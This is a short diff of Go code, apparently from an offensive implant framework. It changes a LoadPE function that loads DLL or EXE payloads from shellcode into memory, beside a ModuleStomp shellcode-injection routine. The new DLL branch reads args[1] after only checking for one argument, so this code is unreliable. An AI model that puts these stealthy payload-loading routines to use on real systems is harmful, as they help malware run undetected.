@@ -576,34 +576,30 @@ func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
 }
 
 func LoadPE(shellcode []byte, args []string) (string, error) {
-	if len(args) != 2 {
+	if len(args) < 1 {
 		return "", errors.New("Not Enough Args.")
 	}
-	peType := args[0]
-	removeH := args[1]
-	removeHeaders, err := strconv.Atoi(removeH)
-	if err != nil {
-		return "", err
-	}
-	var remove bool
-	if removeHeaders == 1 {
-		remove = true
-	}
 	var t int
+	var exportToCall string
+	peType := args[0]
 	if peType == "dll" {
+		exportToCall = args[1]
+		if exportToCall == "" {
+			return "", errors.New("Export Function Not Provided In DLL Mode.")
+		}
 		t = 0
 	} else {
 		t = 1
 	}
 	if peloader.PeType(t) == peloader.Dll {
-		raw := peloader.NewRawPE(peloader.Dll, remove, shellcode)
+		raw := peloader.NewRawPE(peloader.Dll, exportToCall, shellcode)
 		output, err := raw.LoadPEFromMemory()
 		if err != nil {
 			return "", err
 		}
 		return output, nil
 	}
-	raw := peloader.NewRawPE(peloader.Exe, remove, shellcode)
+	raw := peloader.NewRawPE(peloader.Exe, exportToCall, shellcode)
 	output, err := raw.LoadPEFromMemory()
 	if err != nil {
 		return "", err
